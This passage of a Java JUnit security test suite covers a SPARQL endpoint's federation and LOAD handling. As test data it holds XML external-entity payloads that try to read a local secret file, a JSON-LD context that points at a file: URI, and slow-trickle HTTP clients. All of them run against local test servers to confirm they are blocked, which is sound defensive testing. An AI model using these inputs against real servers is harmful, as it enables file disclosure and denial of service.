            assertEquals(204, once.statusCode(), once.body());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:encoded> ?p \"once\" }"));
            var nested = post(ep.url(), "application/sparql-update", "LOAD <" + base(remote) + "/archive.ttl.zip>", null);
            assertEquals(204, nested.statusCode(), nested.body());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:nested> ?p \"inner\" }"));
            for (String path : List.of("/blob", "/second.ttl.zip")) {
                var r = post(ep.url(), "application/sparql-update", "LOAD <" + base(remote) + path + ">", null);
                assertEquals(204, r.statusCode(), path + ": " + r.body());
            }
            assertTrue(ask(ep.url(), "ASK { <urn:ex:blob> ?p ?o . <urn:ex:unnamed> ?q ?r }"));
        } finally {
            remote.stop(0);
        }
    }

    /**
     * What a LOAD's parser fetches on its own is held to the same rules: a JSON-LD
     * {@code @context} read {@code file:///…} and waited past the deadline through jsonld-java's
     * own loader. An http(s) context still works; an XML entity cannot name a local file.
     */
    @Test
    void loadHoldsJsonLdContextsAndXmlEntitiesToTheSameRules(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir)
            throws Exception {
        java.nio.file.Path ctx = dir.resolve("context.json");
        java.nio.file.Files.writeString(ctx, "{\"@context\":{\"p\":\"urn:ex:fromfile\"}}");
        java.nio.file.Path secret = dir.resolve("secret.txt");
        java.nio.file.Files.writeString(secret, "server-side secret");
        String json = "application/ld+json";
        var remote = serve(java.util.Map.of(
                "/ctx.json", respond(200, json, "{\"@context\":{\"p\":\"urn:ex:p\"}}", 0),
                "/slowctx.json", respond(200, json, "{\"@context\":{\"p\":\"urn:ex:p\"}}", 6_000),
                "/xxe.rdf", respond(200, "application/rdf+xml", "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY s SYSTEM \""
                        + secret.toUri() + "\">]><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" "
                        + "xmlns:e=\"urn:ex:\"><rdf:Description rdf:about=\"urn:ex:xxe\"><e:p>&s;</e:p></rdf:Description></rdf:RDF>", 0)));
        var docs = serve(java.util.Map.of(
                "/page.html", respond(200, "text/html", "<html></html>", 0,
                        "Link", "<" + base(remote) + "/ctx.json>; rel=\"alternate\"; type=\"application/ld+json\""),
                "/viapage.jsonld", ex -> respond(200, json, "{\"@context\":\"http://127.0.0.1:" + ex.getLocalAddress().getPort()
                        + "/page.html\",\"@id\":\"urn:ex:viapage\",\"p\":\"linked\"}", 0).handle(ex),
                "/ok.jsonld", respond(200, json, "{\"@context\":\"" + base(remote) + "/ctx.json\",\"@id\":\"urn:ex:ok\",\"p\":\"yes\"}", 0),
                "/file.jsonld", respond(200, json, "{\"@context\":\"" + ctx.toUri() + "\",\"@id\":\"urn:ex:file\",\"p\":\"read\"}", 0),
                "/slow.jsonld", respond(200, json, "{\"@context\":\"" + base(remote) + "/slowctx.json\",\"@id\":\"urn:ex:slow\",\"p\":\"x\"}", 0)));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true)
                .withMaxExecutionSeconds(2), 0)) {
            String d = base(docs);
            var ok = post(ep.url(), "application/sparql-update", "LOAD <" + d + "/ok.jsonld>", null);
            assertEquals(204, ok.statusCode(), ok.body());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:ok> <urn:ex:p> \"yes\" }"), "an http context is still fetched");
            var viaPage = post(ep.url(), "application/sparql-update", "LOAD <" + d + "/viapage.jsonld>", null);
            assertEquals(204, viaPage.statusCode(), viaPage.body());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:viapage> <urn:ex:p> \"linked\" }"), "a Link rel=alternate context was not followed");

            var file = post(ep.url(), "application/sparql-update", "LOAD <" + d + "/file.jsonld>", null);
            assertEquals(502, file.statusCode(), file.body());
            assertFalse(ask(ep.url(), "ASK { <urn:ex:file> ?p ?o }"), "a file: context was read");

            long t0 = System.nanoTime();
            var slow = post(ep.url(), "application/sparql-update", "LOAD <" + d + "/slow.jsonld>", null);
            double took = (System.nanoTime() - t0) / 1e9;
            assertEquals(504, slow.statusCode(), slow.body());
            assertTrue(took < 5, "took " + took + " s");

            var xxe = post(ep.url(), "application/sparql-update", "LOAD <" + base(remote) + "/xxe.rdf>", null);
            assertEquals(502, xxe.statusCode(), xxe.body());
            assertFalse(ask(ep.url(), "ASK { ?s ?p \"server-side secret\" }"), "an XML entity read a local file");
        } finally {
            remote.stop(0);
            docs.stop(0);
        }
    }

    /**
     * A chunked body whose framing never yields a byte — a chunk extension sent a character at a
     * time — kept the slot past the deadline, the traffic keeping the idle timeout away.
     */
    @Test
    void aBodyStuckInChunkFramingIsCutOffAtTheDeadline() throws Exception {
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withMaxConcurrentQueries(1).withMaxUploadSeconds(2), 0);
             java.net.Socket slow = new java.net.Socket("127.0.0.1", URI.create(ep.url()).getPort())) {
            var out = slow.getOutputStream();
            out.write(("POST /sparql HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/sparql-query\r\n"
                    + "Transfer-Encoding: chunked\r\n\r\n3\r\nASK\r\n1;ext=").getBytes(StandardCharsets.US_ASCII));
            out.flush();
            slow.setSoTimeout(15_000);
            var in = new java.io.BufferedReader(new java.io.InputStreamReader(slow.getInputStream(), StandardCharsets.US_ASCII));
            Thread trickle = new Thread(() -> {
                try {
                    for (int i = 0; i < 40; i++) {
                        Thread.sleep(300);
                        out.write('a');
                        out.flush();
                    }
                } catch (Exception ignored) {
                    // the server closed the connection: done
                }
            });
            trickle.setDaemon(true);
            long t0 = System.nanoTime();
            trickle.start();
            String status = in.readLine();
            assertTrue(status != null && status.contains(" 408 "), "status line: " + status);
            assertTrue((System.nanoTime() - t0) / 1e9 < 8, "the deadline took too long");
            assertEquals(200, getWithin(ep.url() + "?query=" + enc("ASK {}"), java.time.Duration.ofSeconds(5)).statusCode(),
                    "the slot was not given back, or the interrupt leaked into the next request");
        }
    }

    /**
     * Socket timeouts bound the wait per byte: a remote trickling its response headers held the
     * only slot for 6.4 s under a 1 s limit. The deadline is absolute now.
     */
    @Test
    void aServiceTricklingItsHeadersIsCutOffAtTheDeadline() throws Exception {
        // headers trickled, then (complete headers) a body trickled: both must end at the deadline
        // and a body RDF4J rejects unread (text/plain): closing it must not wait for the rest
        for (String prefix : List.of("HTTP/1.1 200 OK\r\nX-Slow: ",
                "HTTP/1.1 200 OK\r\nContent-Type: application/sparql-results+json\r\nContent-Length: 5000\r\n\r\n{",
                "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 5000\r\n\r\n")) {
            try (java.net.ServerSocket remote = new java.net.ServerSocket(0, 50, java.net.InetAddress.getLoopbackAddress());
                 Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxExecutionSeconds(1)
                         .withMaxConcurrentQueries(1), 0)) {
                Thread trickler = new Thread(() -> {
                    try (java.net.Socket s = remote.accept()) {
                        var out = s.getOutputStream();
                        out.write(prefix.getBytes(StandardCharsets.US_ASCII));
                        for (int i = 0; i < 100; i++) {
                            Thread.sleep(200);
                            out.write(' ');
                            out.flush();
                        }
                    } catch (Exception ignored) {
                        // the endpoint gave up: done
                    }
                });
                trickler.setDaemon(true);
                trickler.start();
                long t0 = System.nanoTime();
                var r = get(ep.url(), "SELECT * WHERE { SERVICE <http://127.0.0.1:" + remote.getLocalPort() + "/sparql> { ?s ?p ?o } }", null);
                double took = (System.nanoTime() - t0) / 1e9;
                // 504 when the SERVICE deadline ends the read, 503 when RDF4J's own execution
                // limit (the same 1 s) gets there first: both say the limit was hit, and either
                // way the slot is back at once
                if (prefix.contains("text/plain")) {
                    assertTrue(r.statusCode() >= 500, r.statusCode() + " " + r.body());   // rejected: any failure, but at once
                } else {
                    assertTrue(r.statusCode() == 504 || r.statusCode() == 503, prefix + " -> " + r.statusCode() + " " + r.body());
                }
                assertTrue(took < 4, "took " + took + " s");
                assertEquals(200, get(ep.url(), "ASK {}", null).statusCode(), "the slot was not given back");
            }
        }
    }

    /**
     * A finished SERVICE call disarms its deadline at once: cancelled timers stayed queued, with
     * their requests, for the whole deadline. And SPARQL XML from SERVICE is refused: RDF4J's
     * results parser let an external entity read a local file into the results.
     */
    @Test
    void serviceLeavesNoDeadlineArmedAndTakesNoXml(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir) throws Exception {
        java.nio.file.Path secret = dir.resolve("secret.txt");
        java.nio.file.Files.writeString(secret, "server-side secret");
        String xml = "<?xml version=\"1.0\"?><!DOCTYPE s [<!ENTITY x SYSTEM \"" + secret.toUri() + "\">]>"
                + "<sparql xmlns=\"http://www.w3.org/2005/sparql-results#\"><head><variable name=\"o\"/></head><results>"
                + "<result><binding name=\"o\"><literal>&x;</literal></binding></result></results></sparql>";
        var accepts = new java.util.concurrent.ConcurrentLinkedQueue<String>();
        var remote = serve(java.util.Map.of(
                "/json", ex -> {
                    accepts.add(String.valueOf(ex.getRequestHeaders().getFirst("Accept")));
                    respond(200, "application/sparql-results+json",
                            "{\"head\":{\"vars\":[\"o\"]},\"results\":{\"bindings\":[]}}", 0).handle(ex);
                },
                "/xml", respond(200, "application/sparql-results+xml", xml, 0),
                // RDF4J's binary format: magic, version, then a column count its parser allocates for
                "/binary", bytes(new byte[] {'B', 'R', 'T', 'R', 0, 0, 0, 4, 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff},
                        "Content-Type", "application/x-binary-rdf-results-table"),
                // an empty Content-Type first: RDF4J skips it and parses the XML that follows
                "/twotypes", bytes(xml.getBytes(StandardCharsets.UTF_8),
                        "Content-Type", "", "Content-Type", "application/sparql-results+xml"),
                "/empty", ex -> {   // 204: no entity, which RDF4J never closes
                    ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
                    ex.sendResponseHeaders(204, -1);
                    ex.close();
                }));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            for (int i = 0; i < 20; i++) {
                assertEquals(200, get(fed.url(), "SELECT * WHERE { SERVICE <" + base(remote) + "/json> { ?s ?p ?o } }", null).statusCode());
            }
            for (int i = 0; i < 3; i++) {   // answers without a body too
                get(fed.url(), "SELECT * WHERE { SERVICE <" + base(remote) + "/empty> { ?s ?p ?o } }", null);
            }
            assertEquals(0, TimedServiceClient.armedDeadlines(), "finished SERVICE calls left deadlines armed");
            // and finished uploads leave no upload deadline armed (every POST arms one)
            for (int i = 0; i < 20; i++) {
                assertEquals(200, post(fed.url(), "application/sparql-query", "ASK {}", null).statusCode());
            }
            var servlet = servletOf(fed.server());
            assertEquals(0, servlet.armedUploadDeadlines(), "finished uploads left deadlines armed");
            assertFalse(accepts.isEmpty());
            accepts.forEach(a -> assertFalse(a.contains("xml") || a.contains("binary"), "SERVICE asked for XML or binary: " + a));
            var twoTypes = get(fed.url(), "SELECT ?o WHERE { SERVICE <" + base(remote) + "/twotypes> { ?s ?p ?o } }", "text/csv");
            assertTrue(twoTypes.statusCode() >= 500, twoTypes.statusCode() + " " + twoTypes.body());
            assertFalse(twoTypes.body().contains("server-side secret"), "a second Content-Type let XML through");
            var binary = get(fed.url(), "SELECT ?o WHERE { SERVICE <" + base(remote) + "/binary> { ?s ?p ?o } }", "text/csv");
            assertTrue(binary.statusCode() >= 500, "a binary answer read as an empty result: " + binary.statusCode() + " " + binary.body());

            var leak = get(fed.url(), "SELECT ?o WHERE { SERVICE <" + base(remote) + "/xml> { ?s ?p ?o } }", "text/csv");
            assertTrue(leak.statusCode() >= 500, leak.statusCode() + " " + leak.body());
            assertFalse(leak.body().contains("server-side secret"), "an XML entity in a SERVICE answer read a local file");
        }
        // with no execution limit there is no deadline, but XML is refused all the same
        try (Endpoint unlimited = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxExecutionSeconds(0), 0)) {
            var leak = get(unlimited.url(), "SELECT ?o WHERE { SERVICE <" + base(remote) + "/xml> { ?s ?p ?o } }", "text/csv");
            assertTrue(leak.statusCode() >= 500, leak.statusCode() + " " + leak.body());
            assertFalse(leak.body().contains("server-side secret"), "with no limit, an XML entity read a local file");
        } finally {
            remote.stop(0);
        }
    }

    /**
     * A resolver with a session manager of its own ignored the client silently, and SERVICE ran
     * without its limits. Installed through the manager now; and a servlet whose repository's
     * client lacks them refuses SERVICE instead of running it — and its service description does
     * not advertise sd:BasicFederatedQuery (an untested gate, found in the Opus co-review of #130).
     */
    @Test
    void serviceRunsOnlyWithItsLimitsInstalled() throws Exception {
        var remote = serve(java.util.Map.of("/fast", respond(200, "application/sparql-results+json",
                "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 0)));
        var manager = new org.eclipse.rdf4j.http.client.SharedHttpClientSessionManager();
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        String q = "SELECT * WHERE { SERVICE <" + base(remote) + "/fast> { ?s ?p ?o } }";
        try {
            // its own manager: the protected client must still be the one in use
            ((org.eclipse.rdf4j.http.client.SessionManagerDependent)
                    ((org.eclipse.rdf4j.repository.sail.SailRepository) engine.getRepository()).getFederatedServiceResolver())
                    .setHttpClientSessionManager(manager);
            Server server = SparqlEndpointLauncher.startServer(engine, "127.0.0.1", 0,
                    EndpointOptions.defaults().withFederationEnabled(true), 64, false);
            try {
                assertTrue(SparqlEndpointLauncher.outboundLimited(engine.getRepository()));
                String url = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort() + "/sparql";
                assertEquals(200, get(url, q, null).statusCode());
            } finally {
                server.stop();
            }
        } finally {
            engine.close();
            manager.shutDown();
        }
        // the servlet mounted without limitOutboundRequests: SERVICE waits for it
        CQELSEngine bare = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        bare.start();
        Server server = SparqlEndpointLauncher.startServer(bare::getRepository, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withFederationEnabled(true), 64, false);
        try {
            String url = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort() + "/sparql";
            var refused = get(url, q, null);
            assertEquals(503, refused.statusCode(), refused.body());
            assertTrue(refused.body().contains("limitOutboundRequests"), refused.body());
            // and the service description does not advertise what it would refuse
            var described = bare(url, "text/turtle");
            assertEquals(200, described.statusCode(), described.body());
            assertFalse(description(described, org.eclipse.rdf4j.rio.RDFFormat.TURTLE)
                    .contains(null, sd("feature"), sd("BasicFederatedQuery")), described.body());
        } finally {
            server.stop();
            bare.close();
            remote.stop(0);
        }
    }

    /** Apache resolves names before abort() can reach anything: a stalled lookup outlived the deadline. */
    @Test
    void aStalledNameLookupEndsAtTheDeadline() throws Exception {
        var release = new java.util.concurrent.CountDownLatch(1);
        TimedServiceClient client = new TimedServiceClient(1000, host -> {
            try {
                release.await();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            throw new java.net.UnknownHostException(host);
        });
        try {
            long t0 = System.nanoTime();
            var e = assertThrows(IOException.class,
                    () -> client.execute(new org.apache.http.client.methods.HttpGet("http://stalled.example/sparql")));
            double took = (System.nanoTime() - t0) / 1e9;
            assertTrue(took < 2.5, "took " + took + " s");
            boolean timeout = false;
            for (Throwable t = e; t != null; t = t.getCause()) {
                timeout |= t instanceof java.net.SocketTimeoutException;
            }
            assertTrue(timeout, "not reported as a timeout: " + e);
        } finally {
            release.countDown();
            client.close();
        }
    }

    /** Apache shuts its pool down on an Error: kept, that pool failed every later SERVICE. */
    @Test
    void serviceRecoversFromAnErrorInsideTheHttpClient() throws Exception {
        var remote = serve(java.util.Map.of("/fast", respond(200, "application/sparql-results+json",
                "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 0)));
        var first = new java.util.concurrent.atomic.AtomicBoolean(true);
        TimedServiceClient client = new TimedServiceClient(5000, host -> {
            if (first.getAndSet(false)) {
                throw new OutOfMemoryError("stand-in for a heap that ran out mid-request");
            }
            return org.apache.http.impl.conn.SystemDefaultDnsResolver.INSTANCE.resolve(host);
        });
        String url = "http://localhost:" + remote.getAddress().getPort() + "/fast";
        try {
            int armedBefore = TimedServiceClient.armedDeadlines();
            assertThrows(OutOfMemoryError.class, () -> client.execute(new org.apache.http.client.methods.HttpGet(url)));
            assertEquals(armedBefore, TimedServiceClient.armedDeadlines(), "the Error left its deadline armed");
            try (var response = client.execute(new org.apache.http.client.methods.HttpGet(url))) {
                assertEquals(200, response.getStatusLine().getStatusCode(), "the pool the Error shut down was kept");
            }
        } finally {
            client.close();
            remote.stop(0);
        }
    }

    /** A lookup gets what is left of the request's deadline, not a fresh timeout. */
    @Test
    void aNameLookupGetsOnlyWhatIsLeftOfTheDeadline() throws Exception {
        var release = new java.util.concurrent.CountDownLatch(1);
        var dns = new TimedServiceClient.BoundedDns(host -> {
            try {
                release.await();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            throw new java.net.UnknownHostException(host);
        }, 1000);
        TimedServiceClient.BoundedDns.DEADLINE.set(System.nanoTime() + 300_000_000L);   // only 300 ms of the deadline left
        try {
            long t0 = System.nanoTime();
            assertThrows(java.net.UnknownHostException.class, () -> dns.resolve("stalled.example"));
            double took = (System.nanoTime() - t0) / 1e9;
            assertTrue(took < 0.8, "the lookup waited a fresh timeout: " + took + " s");
        } finally {
            TimedServiceClient.BoundedDns.DEADLINE.remove();
            release.countDown();
        }
    }

    /** A metadata query made its own SERVICE resolver, with RDF4J's untimed client. */
    @Test
    void serviceInAMetadataQueryHasTheDeadlineToo() throws Exception {
        var remote = serve(java.util.Map.of(
                "/slow", respond(200, "application/sparql-results+json", "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 5_000),
                "/fast", respond(200, "application/sparql-results+json", "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 0)));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMetadataEnabled(true)
                .withMaxExecutionSeconds(1), 0)) {
            long t0 = System.nanoTime();
            var r = get(ep.url(), "SELECT * FROM <" + META + "> WHERE { SERVICE <" + base(remote) + "/slow> { ?s ?p ?o } }", null);
            assertEquals(504, r.statusCode(), r.body());
            assertTrue((System.nanoTime() - t0) / 1e9 < 4);
            // the snapshot's shutdown left the shared resolver working
            var after = get(ep.url(), "SELECT * WHERE { SERVICE <" + base(remote) + "/fast> { ?s ?p ?o } }", null);
            assertEquals(200, after.statusCode(), after.body());
        } finally {
            remote.stop(0);
        }
    }

    /**
     * Stopping Jetty closed the SERVICE client but left it installed, so a restart broke
     * federation; and handing RDF4J's client back on stop would have left the engine a closed one.
     */
    @Test
    void federationSurvivesAJettyRestart() throws Exception {
        var remote = serve(java.util.Map.of("/fast", respond(200, "application/sparql-results+json",
                "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 0)));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String q = "SELECT * WHERE { SERVICE <" + base(remote) + "/fast> { ?s ?p ?o } }";
            assertEquals(200, get(ep.url(), q, null).statusCode());
            ep.server().stop();
            ep.server().start();
            String url = "http://127.0.0.1:" + ((ServerConnector) ep.server().getConnectors()[0]).getLocalPort() + "/sparql";
            var again = get(url, q, null);
            assertEquals(200, again.statusCode(), again.body());
            // the servlet instance is reused: a POST (which arms the upload watchdog) still works
            var posted = post(url, "application/sparql-query", "ASK {}", null);
            assertEquals(200, posted.statusCode(), posted.body());
            // and once the endpoint stops, the client's connections are let go, the client stays
            // installed, and the engine's own resolver still works (reopening them)
            var resolver = (org.eclipse.rdf4j.http.client.HttpClientDependent)
                    ((org.eclipse.rdf4j.repository.sail.SailRepository) ep.engine().getRepository()).getFederatedServiceResolver();
            var client = (TimedServiceClient) resolver.getHttpClient();
            assertTrue(client.poolOpen());
            ep.server().stop();
            assertFalse(client.poolOpen(), "Jetty stopped and the SERVICE connections stayed open");
            try (RepositoryConnection c = ep.engine().getRepository().getConnection();
                 var rows = c.prepareTupleQuery(q).evaluate()) {
                assertFalse(rows.hasNext());
            }
        } finally {
            remote.stop(0);
        }
    }

    // ---- start-up refusal -------------------------------------------------------------------

    @Test
    void remoteBindWithoutTokenIsRefused() {
        assertThrows(IllegalStateException.class,
                () -> SparqlEndpointLauncher.requireTokenForRemoteBind("0.0.0.0", null, false));
        SparqlEndpointLauncher.requireTokenForRemoteBind("0.0.0.0", "t", false);
        SparqlEndpointLauncher.requireTokenForRemoteBind("0.0.0.0", null, true);
        SparqlEndpointLauncher.requireTokenForRemoteBind("127.0.0.1", null, false);
        SparqlEndpointLauncher.requireTokenForRemoteBind("localhost", null, false);
    }

    /** The refusal was in main only, so a program embedding through startServer opened an unauthenticated 0.0.0.0. */
    @Test
    void startServerItselfRefusesAnUnauthenticatedRemoteBind() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        try {
            var e = assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine,
                    "0.0.0.0", 0, EndpointOptions.defaults(), 64, false));
            assertTrue(e.getMessage().contains("CQELS_SPARQL_AUTH_TOKEN"), e.getMessage());
            assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine::getRepository,
                    null, "0.0.0.0", 0, EndpointOptions.defaults(), 64, false));
            // no host is every interface to Jetty, so it is not loopback either
            assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine,
                    null, 0, EndpointOptions.defaults(), 64, false));
        } finally {
            engine.close();
        }
    }

    @Test
    void negotiationHelper() {
        var reg = org.eclipse.rdf4j.query.resultio.TupleQueryResultWriterRegistry.getInstance();
        org.eclipse.rdf4j.query.resultio.QueryResultFormat json = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.JSON;
        var csv = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.CSV;
        var tsv = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.TSV;
        assertEquals(json, SparqlProtocolServlet.negotiate(null, reg, json).orElseThrow().format());
        assertEquals("application/sparql-results+json", SparqlProtocolServlet.negotiate("*/*", reg, json).orElseThrow().mediaType());
        assertEquals(csv, SparqlProtocolServlet.negotiate("text/csv", reg, json).orElseThrow().format());
        assertTrue(SparqlProtocolServlet.negotiate("image/png", reg, json).isEmpty());
        assertTrue(SparqlProtocolServlet.negotiate("text/*", reg, json).isPresent());
        // q=0 is an exclusion the wildcard must not override (RFC 9110 §12.5.1) — of that media
        // type; JSON's other alias is still acceptable through */* and labels the response
        var n = SparqlProtocolServlet.negotiate("application/sparql-results+json;q=0, */*", reg, json).orElseThrow();
        assertFalse(n.mediaType().equals("application/sparql-results+json"), n.toString());
        assertTrue(SparqlProtocolServlet.negotiate("*/*;q=0", reg, json).isEmpty());
        // excluding one alias leaves an explicitly accepted one
        n = SparqlProtocolServlet.negotiate("application/json;q=0, application/sparql-results+json", reg, json).orElseThrow();
        assertEquals("application/sparql-results+json", n.mediaType());
        n = SparqlProtocolServlet.negotiate("application/json", reg, json).orElseThrow();
        assertEquals(json, n.format());
        assertEquals("application/json", n.mediaType());
        // parameters: q is case-insensitive; a range with parameters is more specific, and matches
        // only what the writer produces (CSV is UTF-8)
        assertTrue(SparqlProtocolServlet.negotiate("application/sparql-results+json;Q=0", reg, json).isEmpty());
        assertEquals("text/csv", SparqlProtocolServlet.negotiate("text/csv;q=0, text/csv;charset=UTF-8", reg, json)
                .orElseThrow().mediaType());
        assertTrue(SparqlProtocolServlet.negotiate("text/csv;charset=ISO-8859-1", reg, json).isEmpty());
        assertTrue(SparqlProtocolServlet.negotiate("text/csv;charset=utf-8;q=0.5", reg, json).isPresent());
        // equal q: the more specific range wins, then the one listed first
        assertEquals(tsv, SparqlProtocolServlet.negotiate("*/*, text/tab-separated-values", reg, json).orElseThrow().format());
        assertEquals(csv, SparqlProtocolServlet.negotiate("text/csv, application/sparql-results+json", reg, json).orElseThrow().format());
    }

    @Test
    void repeatedAcceptFieldsAreOneList() throws Exception {
        var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("ASK {}")))
                .header("Accept", "image/png").header("Accept", "application/sparql-results+xml").build(),
                HttpResponse.BodyHandlers.ofString());
        assertEquals(200, r.statusCode(), r.body());
        assertTrue(type(r).startsWith("application/sparql-results+xml"), type(r));
        var excluded = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("SELECT * WHERE {}")))
                .header("Accept", "*/*").header("Accept", "application/sparql-results+json;q=0").build(),
                HttpResponse.BodyHandlers.ofString());
        assertEquals(200, excluded.statusCode());
        assertFalse(type(excluded).startsWith("application/sparql-results+json"), type(excluded));
    }

    @Test
    void formBodyDecodesInItsDeclaredCharset() throws Exception {
        // %E9 is é in ISO-8859-1 and an invalid byte in UTF-8
        var r = post(shared.url(), "application/x-www-form-urlencoded; charset=ISO-8859-1",
                "query=SELECT+%28%22caf%E9%22+AS+%3Fx%29+WHERE+%7B%7D", "text/csv");
        assertEquals(200, r.statusCode(), r.body());
        assertTrue(r.body().contains("café"), r.body());
        var utf8 = post(shared.url(), "application/x-www-form-urlencoded",
                "query=SELECT+%28%22caf%C3%A9%22+AS+%3Fx%29+WHERE+%7B%7D", "text/csv");
        assertTrue(utf8.body().contains("café"), utf8.body());
        // Shift_JIS テスト is 83 65 83 58 83 67: the trailing bytes are ASCII e, X, g, so a form
        // encoder leaves them unescaped and they must join the escaped lead bytes
        var sjis = post(shared.url(), "application/x-www-form-urlencoded; charset=Shift_JIS",
                "query=SELECT+%28%22%83e%83X%83g%22+AS+%3Fx%29+WHERE+%7B%7D", "text/csv");
        assertEquals(200, sjis.statusCode(), sjis.body());
        assertTrue(sjis.body().contains("テスト"), sjis.body());
        var unknown = post(shared.url(), "application/x-www-form-urlencoded; charset=no-such-charset", "query=ASK%7B%7D", null);
        assertEquals(415, unknown.statusCode(), unknown.body());
    }

    @Test
    void listeningUrlBracketsIpv6() {
        assertEquals("http://[::1]:8089/sparql", SparqlEndpointLauncher.listeningUrl("::1", 8089, "/sparql"));
        assertEquals("http://[::1]:8089/sparql", SparqlEndpointLauncher.listeningUrl("[::1]", 8089, "/sparql"));
        assertEquals("http://127.0.0.1:1/q", SparqlEndpointLauncher.listeningUrl("127.0.0.1", 1, "/q"));
    }

    @Test
    void nativeStoreIsReleasedAfterShutdown(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir) throws Exception {
        for (int run = 0; run < 2; run++) {   // a second open of the same directory needs the lock released
            var store = SparqlEndpointLauncher.openNativeStore(dir.toString());
            CQELSEngine engine = SparqlEndpointLauncher.buildEngine(store);
            engine.start();
            engine.close();
            store.shutDown();
            assertFalse(store.isInitialized());
        }
    }

    // ---- the audit after #121: protocol details, operations, the tests it found missing -------

    /** Opens a raw connection and sends a POST's headers and the first part of its body. */
    static java.net.Socket startUpload(String url, int contentLength, String firstPart) throws IOException {
        return startUpload(url, contentLength, firstPart, "");
    }

    /** @param headers further header lines, each ending in CRLF */
    static java.net.Socket startUpload(String url, int contentLength, String firstPart, String headers) throws IOException {
        URI u = URI.create(url);
        java.net.Socket s = new java.net.Socket("127.0.0.1", u.getPort());
        var out = s.getOutputStream();
        out.write(("POST " + u.getPath() + " HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/sparql-query\r\n"
                + headers + "Content-Length: " + contentLength + "\r\nConnection: close\r\n\r\n" + firstPart)
                .getBytes(StandardCharsets.US_ASCII));
        out.flush();
        return s;
    }

    /** Sends one GET on a kept-alive raw connection and returns its status line, reading the body by Content-Length. */
    static String exchange(java.net.Socket s, String pathAndQuery) throws IOException {
        s.getOutputStream().write(("GET " + pathAndQuery + " HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n").getBytes(StandardCharsets.US_ASCII));
        s.getOutputStream().flush();
        var in = s.getInputStream();
        StringBuilder head = new StringBuilder();
        while (!head.toString().endsWith("\r\n\r\n")) {
            int c = in.read();
            if (c < 0) {
                return head.length() == 0 ? "closed" : head.toString().lines().findFirst().orElse("closed");
            }
            head.append((char) c);
        }
        int length = head.toString().lines().filter(l -> l.regionMatches(true, 0, "Content-Length:", 0, 15))
                .map(l -> Integer.parseInt(l.substring(15).trim())).findFirst().orElse(0);
        in.readNBytes(length);
        return head.toString().lines().findFirst().orElseThrow();
    }

    /**
     * Stops a server whose drain will run out. Jetty may then throw a TimeoutException and leave
     * the server FAILED (it does when the request is stuck past its body), having stopped its
     * connectors and handlers all the same.
     */
    static void stopPastTheDrain(Server server) throws Exception {
        try {
            server.stop();
        } catch (java.util.concurrent.TimeoutException ranOut) {
            // the drain ran out; the stop went on
        }
        assertTrue(server.getConnectors()[0].isStopped(), "the connector still runs");
        assertTrue(server.getDescendant(org.eclipse.jetty.ee10.servlet.ServletContextHandler.class).isStopped(),
                "the context still runs");
    }

    static void awaitSlotsInUse(SparqlProtocolServlet servlet, int n) throws InterruptedException {
        for (int i = 0; i < 100 && servlet.slotsInUse() != n; i++) {
            Thread.sleep(50);
        }
        assertEquals(n, servlet.slotsInUse(), "slots in use");
    }

    static String base(Server server) {
        return "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort();
    }

    @Test
    void anOperationParameterGivenTwiceIs400() throws Exception {
        // the first one used to win, and a URL parameter beat the form body
        var twice = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("ASK {}")
                + "&query=SELEKT")).build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(400, twice.statusCode(), twice.body());
        assertTrue(twice.body().contains("'query' is given 2 times"), twice.body());
        var updateTwice = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?update=" + enc("CLEAR ALL")
